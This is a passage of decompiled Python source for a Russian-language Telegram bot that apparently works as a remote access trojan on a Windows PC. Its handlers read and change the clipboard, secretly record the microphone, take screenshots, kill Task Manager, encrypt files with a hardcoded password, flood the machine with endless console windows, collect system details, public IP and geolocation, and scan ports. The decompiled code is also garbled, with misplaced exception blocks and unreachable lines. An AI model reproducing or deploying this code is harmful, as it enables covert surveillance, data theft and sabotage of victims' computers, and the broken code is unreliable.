    if message.from_user.id in ALLOWED_USER_ID:
        user_data = await state.get_data()
        directoryForSaveFiles = user_data.get('directoryForSaveFiles')
        if directoryForSaveFiles and (not os.path.isdir(directoryForSaveFiles)):
            await message.reply('–ù–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–Ω–∞—á–∞–ª–∞ —É–∫–∞–∑–∞—Ç—å –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –ø—É—Ç—å –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ñ–∞–π–ª–∞. \n–ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞, –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏–≤ –∫–æ–º–∞–Ω–¥—É.')
            await state.clear()
            return
        else:  # inserted
            if message.document:
                document = message.document
            else:  # inserted
                if message.photo:
                    document = message.photo[(-1)]
                else:  # inserted
                    await message.reply('–í —Å–æ–æ–±—â–µ–Ω–∏–∏ –Ω–µ—Ç –¥–æ–∫—É–º–µ–Ω—Ç–∞ –∏–ª–∏ —Ñ–æ—Ç–æ.')
                    return
            file_id = document.file_id
            file_name = document.file_name if hasattr(document, 'file_name') else 'photo.jpg'
            try:
                await message.reply('–ü—Ä–∏–Ω—è–ª, —Å–æ—Ö—Ä–∞–Ω—è—é.')
            except Exception as e:
                    file_info = await bot.get_file(file_id)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.reply(f'–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞: {e}')
        return

@dp.message(F.text.lower() == '–∑–∞–ø–∏—Å—å –∞—É–¥–∏–æ')
async def audio_record(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–£–∫–∞–∂–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö')
        await state.set_state(WaitingForInput.waiting_for_audio_recording_duration)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_audio_recording_duration)
async def process_audio_time_input(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        try:
            recording_time = int(message.text)
            await start_audio_recording(message, state, recording_time)
        except ValueError:
            pass  # postinserted
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—É—é –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤ —Å–µ–∫—É–Ω–¥–∞—Ö')
        await state.clear()

async def start_audio_recording(message: types.Message, state: FSMContext, recording_time: int):
    if message.from_user.id in ALLOWED_USER_ID:
        FORMAT = np.int16
        CHANNELS = 1
        RATE = 44100
        CHUNK = 1024
        OUTPUT_FILENAME = 'output.wav'
        save_audio = os.path.join(directory, OUTPUT_FILENAME)
        await message.answer('–ù–∞—á–∞–ª–æ –∑–∞–ø–∏—Å–∏...')
        frames = []
        try:
            recording = sd.rec(int(RATE * recording_time), samplerate=RATE, channels=CHANNELS, dtype=FORMAT)
            sd.wait()
            frames = recording
        except Exception as e:
            pass  # postinserted
        else:  # inserted
            await message.answer('–ó–∞–ø–∏—Å—å –∑–∞–≤–µ—Ä—à–µ–Ω–∞.')
        with wave.open(save_audio, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(2)
            wf.setframerate(RATE)
            wf.writeframes(frames.tobytes())
        try:
            file_to_send = FSInputFile(save_audio)
            await message.answer_document(document=file_to_send, caption='–í–æ—Ç –∑–∞–ø–∏—Å—å –∞—É–¥–∏–æ!')
        except Exception as e:
                os.remove(save_audio)
                await state.clear()
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø–∏—Å–∏: {e}')
        await message.answer(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞: {e}')

@dp.message(F.text.lower() == '–ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞')
async def conten(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        clipboard_content = pyperclip.paste()
        await message.answer(f'–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞:\n{clipboard_content}')
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '–∏–∑–º–µ–Ω–∏—Ç—å –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞')
async def new_Clipboard(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–•–æ—Ä–æ—à–æ, –æ—Ç–ø—Ä–∞–≤—å –º–Ω–µ —Ç–µ–∫—Å—Ç –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π —Ö–æ—á–µ—à—å –∑–∞–º–µ–Ω–∏—Ç—å –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞')
        await state.set_state(WaitingForInput.waiting_for_clipboard_change)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_clipboard_change)
async def new_Clipboard_wait(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        new_text = message.text
        pyperclip.copy(new_text)
        await message.answer('–¢–µ–∫—Å—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–º–µ—â–µ–Ω –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞!')
        await state.clear()
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '–æ—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É')
async def open_url(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–û–∫, –∫–∏–¥–∞–π —Å—Å—ã–ª–∫—É.')
        await state.set_state(WaitingForInput.waiting_for_url_open)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_url_open)
async def open_url(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        url = message.text
        webbrowser.open(url)
        await asyncio.sleep(1)
        await message.answer('–°—Å—ã–ª–∫–∞ –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã—Ç–∞:')
        screenshot = pyautogui.screenshot()
        filename = 'screenshot.png'
        filepath = os.path.join(directory, filename)
        os.makedirs(directory, exist_ok=True)
        screenshot.save(filepath)
        photo = FSInputFile(filepath)
        await message.answer_photo(photo)
        if os.path.exists(filepath):
            os.remove(filepath)
        await state.clear()
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '–∑–∞–∫—Ä—ã—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á')
async def open_url(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == 'Taskmgr.exe':
                psutil.Process(proc.info['pid']).terminate()
                await message.answer('Task Manager –∑–∞–∫—Ä—ã—Ç.')
                return
        else:  # inserted
            await message.answer('–î–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á –Ω–µ –∑–∞–ø—É—â–µ–Ω.')
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '–≤—ã–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫')
async def open_url(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        def mute_sound():
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMute(1, None)
        mute_sound()
        await message.answer('–ó–≤—É–∫ –æ—Ç–∫–ª—é—á–µ–Ω.')
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '–≤–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫')
async def open_url(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        def mute_sound():
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMute(0, None)
        mute_sound()
        await message.answer('–ó–≤—É–∫ –≤–∫–ª—é—á–µ–Ω.')
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '–∑–≤—É–∫ –Ω–∞ 100%')
async def open_url(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        def set_volume_to_100():
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevelScalar(1.0, None)
        set_volume_to_100()
        await message.answer('–ì—Ä–æ–º–∫–æ—Å—Ç—å –±—ã–ª–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ 100%‚úÖ')
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dp.message(F.text.lower() == '–∑–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª')
async def start_encryption(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('*–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞\\, –ø—Ä–∏–º–µ—Ä:*\nC:/Users/Public/–ù–∞–∑–≤–∞–Ω–∏–µ\\_—Ñ–∞–π–ª–∞\\.txt', parse_mode='MarkdownV2')
        await state.set_state(WaitingForInput.waiting_for_file_encryption_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_file_encryption_path)
async def process_file_path(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        file_path = message.text
        try:
            if os.path.exists(file_path):
                def generate_key(password: str, salt: bytes) -> bytes:
                    kdf = Scrypt(salt=salt, length=32, n=16384, r=8, p=1, backend=default_backend())
                    return kdf.derive(password.encode())

                def encrypt_file(file_path: str, password: str):
                    try:
                        salt = os.urandom(16)
                        key = generate_key(password, salt)
                        iv = os.urandom(16)
                        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
                        encryptor = cipher.encryptor()
                        with open(file_path, 'rb') as f:
                            pass  # postinserted
                    except Exception as e:
                            file_data = f.read()
                                padder = padding.PKCS7(128).padder()
                                padded_data = padder.update(file_data) + padder.finalize()
                                encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
                                with open(file_path, 'wb') as f:
                                    f.write(salt + iv + encrypted_data)
                                        return True
                            logger.error(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–∏ —Ñ–∞–π–ª–∞ {file_path}: {e}')
                            return False
                        else:  # inserted
                            pass
                password = 'kjesbfskjfbalga;ewgb/gebiwekwfnwgwawgeogk4egikaleikdrinlomgs;oegm'
                success = encrypt_file(file_path, password)
                if success:
                    await message.answer(f'*–§–∞–π–ª* \'{file_path}\' *—É—Å–ø–µ—à–Ω–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω.*', parse_mode='Markdown')
        except Exception as e:
                        await state.clear()
                else:  # inserted
                    await message.answer(f'–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–∏ —Ñ–∞–π–ª–∞ {file_path}. –ü—Ä–æ—Ü–µ—Å—Å –ø—Ä–µ–∫—Ä–∞—â—ë–Ω.')
                        await state.clear()
            else:  # inserted
                await message.answer(f'–§–∞–π–ª {file_path} –Ω–µ –±—ã–ª –Ω–∞–π–¥–µ–Ω. \n–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å –ø—É—Ç–∏ –∏ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞, –∑–∞—Ç–µ–º –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É.')
                    await state.clear()
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await state.clear()
        return

@dp.message(F.text.lower() == '—Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª')
async def start_decipher(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('*–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞\\, –ø—Ä–∏–º–µ—Ä:*\nC:/Users/Public/–ù–∞–∑–≤–∞–Ω–∏–µ\\_—Ñ–∞–π–ª–∞\\.txt', parse_mode='MarkdownV2')
        await state.set_state(WaitingForInput.waiting_for_file_decryption_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_file_decryption_path)
async def process_file_path(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        encrypted_file_path = message.text

        async def generate_key(password: str, salt: bytes) -> bytes:
            kdf = Scrypt(salt=salt, length=32, n=16384, r=8, p=1, backend=default_backend())
            return kdf.derive(password.encode())

        async def decrypt_file(file_path: str, password: str):
            try:
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        pass  # postinserted
            except Exception as e:
                        salt = f.read(16)
                        iv = f.read(16)
                        encrypted_data = f.read()
                            key = await generate_key(password, salt)
                                cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
                                decryptor = cipher.decryptor()
                                decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
                                unpadder = padding.PKCS7(128).unpadder()
                                unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
                                decrypted_file_path = f'{os.path.basename(file_path)}'
                                with open(decrypted_file_path, 'wb') as f:
                                    f.write(unpadded_data)
                                        await message.answer(f'*–§–∞–π–ª* \'{decrypted_file_path}\' *—É—Å–ø–µ—à–Ω–æ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω.*‚úÖ', parse_mode='Markdown')
                                            await state.clear()
                                                return True
                else:  # inserted
                    await message.answer(f'–§–∞–π–ª {file_path} –Ω–µ –Ω–∞–π–¥–µ–Ω.')
                        await state.clear()
                    await message.answer(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–µ —Ñ–∞–π–ª–∞ {file_path}: {e}')
                    await state.clear()
                    return False
        password = 'kjesbfskjfbalga;ewgb/gebiwekwfnwgwawgeogk4egikaleikdrinlomgs;oegm'
        await decrypt_file(encrypted_file_path, password)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == 'cmd –±–æ–º–±–∞')
async def start_decipher(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–û—Å—Ç–æ—Ä–æ–∂–Ω–æ ‚ùóÔ∏è\n–ï—Å–ª–∏ –∑–∞–ø—É—Å—Ç–∏—Ç—å —ç—Ç—É –∫–æ–º–∞–Ω–¥—É –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ, –ø–æ–º–æ–∂–µ—Ç —Ç–æ–ª—å–∫–æ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –ü–ö.\n–í–≤–µ–¥–∏ —Å–∫–æ–ª—å–∫–æ —Ä–∞–∑ —Ö–æ—á–µ—à—å –æ—Ç–∫—Ä—ã—Ç—å –∫–æ–Ω—Å–æ–ª—å: \n–ï—Å–ª–∏ —Ö–æ—á–µ—à—å –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ, —Ç–æ –≤–≤–µ–¥–∏ 404')
        await state.set_state(WaitingForInput.waiting_for_cmd_window_count)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_cmd_window_count)
async def process_file_path(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        try:
            BOOM = int(message.text)
            if BOOM < 0:
                await message.answer('–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –Ω–µ–æ—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–º. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.')
        except ValueError:
                    return
            else:  # inserted
                if BOOM == 404:
                    while True:
                        subprocess.Popen('start cmd', shell=True)
                for _ in range(BOOM):
                    subprocess.Popen('start cmd', shell=True)
                await state.clear()
                    await message.answer('–ö–æ–Ω—Å–æ–ª–∏ –æ—Ç–∫—Ä—ã—Ç—ã.')
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ.')
        return
    except Exception as e:
        await message.answer(f'–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}')
        return

@dp.message(lambda message: message.text and message.text.lower() == '–¥–∞–Ω–Ω—ã–µ –ø–∫')
async def handle_message(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–ù–∞—á–∏–Ω–∞–µ–º —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –æ –ü–ö. –≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä–æ–µ –≤—Ä–µ–º—è.')
        break
        try:
            cpu_info = {'brand_raw': '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ', 'arch': platform.architecture()[0], 'cores': psutil.cpu_count(logical=False), 'logical_cores': psutil.cpu_count(logical=True)}
        except Exception as e:
            pass  # postinserted
        else:  # inserted
            try:
                result = subprocess.run(['nvidia-smi', '--query-gpu=name,memory.total', '--format=csv,noheader,nounits'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                lines = result.stdout.strip().split('\n')
                if lines:
                    name, memory = lines[0].split(',')
                    gpu_info = f'–ú–æ–¥–µ–ª—å: {name.strip()}, –ü–∞–º—è—Ç—å: {memory.strip()} GB'
                else:  # inserted
                    gpu_info = '–í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞'
            finally:  # inserted
                system_info = platform.uname()
                user_name = getpass.getuser()

                async def fetch_public_ip():
                    try:
                        async with aiohttp.ClientSession() as session:
                            pass  # postinserted
                    except asyncio.TimeoutError:
                                async with session.get('https://api.ipify.org?format=json', timeout=5) as response:
                                    data = await response.json()
                                    return data['ip']
                            return '–ü—Ä–µ–≤—ã—à–µ–Ω–æ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –¥–ª—è IP-–∞–¥—Ä–µ—Å–∞'
                        except Exception as e:
                            return f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ IP: {e}'

                async def fetch_ip_info():
                    try:
                        async with aiohttp.ClientSession() as session:
                            pass  # postinserted
                    except asyncio.TimeoutError:
                                async with session.get('http://ip-api.com/json/', timeout=5) as response:
                                    return await response.json()
                            return {'error': '–ü—Ä–µ–≤—ã—à–µ–Ω–æ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –¥–ª—è IP-–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏'}
                        except Exception as e:
                            return {'error': str(e)}
                public_ip, ip_info = await asyncio.gather(fetch_public_ip(), fetch_ip_info())
        except Exception as e:
                    hostname = socket.gethostname()
                    local_ip = socket.gethostbyname(hostname)
                    width, height = pyautogui.size()
                    total, used, free = shutil.disk_usage('/')
                    result = subprocess.run(['powershell', '-Command', 'Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    lines = result.stdout.strip().split('\n')
                    for line in lines:
                        if line.strip():
                            if line.strip() == 'Name':
                                continue
                            cpu_name = line.strip()
                            break
                    else:  # inserted
                        cpu_name = '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞.'
                    await message.answer('–§–æ—Ä–º–∏—Ä—É–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç—á–µ—Ç...')
                        report = f"\n            –î–∞–Ω–Ω—ã–µ –ü–ö:\n            –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: {cpu_name}\n            –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞: {cpu_info['arch']}\n            –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —è–¥–µ—Ä –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞: {cpu_info['cores']}\n            –õ–æ–≥–∏—á–µ—Å–∫–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —è–¥–µ—Ä: {cpu_info['logical_cores']}\n            –í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞: {gpu_info}\n            –û–±—â–∞—è –ø–∞–º—è—Ç—å –û–ó–£: {psutil.virtual_memory().total / 1073741824:.2f} GB\n            –ü–∞–º—è—Ç—å –ü–ö: –°–≤–æ–±–æ–¥–Ω–æ {total // 1073741824} –ì–ë –∏–∑ {system_info.system} {system_info.release}\n            –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {user_name}\n            –ò–º—è –ü–ö: {hostname}\n            –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞: {width}x{height} \n            –ü—É–±–ª–∏—á–Ω—ã–π IP-–∞–¥—Ä–µ—Å: {public_ip}\n            –õ–æ–∫–∞–ª—å–Ω—ã–π IP-–∞–¥—Ä–µ—Å: {local_ip}\n            –î–∞–Ω–Ω—ã–µ –ª–æ–∫–∞—Ü–∏–∏ –∏ IP: {ip_info}\n            "
                        await message.answer(report)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö –æ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–µ: {e}')
        await message.answer(f'–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö: {e}')
        return

@dp.message(lambda message: message.text and message.text.lower() == '–¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞ —Å–µ—Ç–∏')
async def handle_network_diagnostics(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ —ç—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä–æ–µ –≤—Ä–µ–º—è.')

        async def ping(host):
            try:
                result = subprocess.run(['ping', '-c', '4', host], capture_output=True, text=True)
                return result.stdout
            except Exception as e:
                return f'–û—à–∏–±–∫–∞ –ø–∏–Ω–≥–∞: {e}'

        async def traceroute(host):
            try:
                result = subprocess.run(['traceroute', host], capture_output=True, text=True)
                return result.stdout
            except Exception as e:
                return f'–û—à–∏–±–∫–∞ —Ç—Ä–∞—Å—Å–∏—Ä–æ–≤–∫–∏: {e}'

        async def scan_ports(host, ports):
            open_ports = []
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((host, port))
                    if result == 0:
                        open_ports.append(port)
                    sock.close()
                except Exception as e:
                    pass  # postinserted
            else:  # inserted
                return open_ports
                return f'–û—à–∏–±–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø–æ—Ä—Ç–æ–≤: {e}'

        async def get_network_info():
            try:
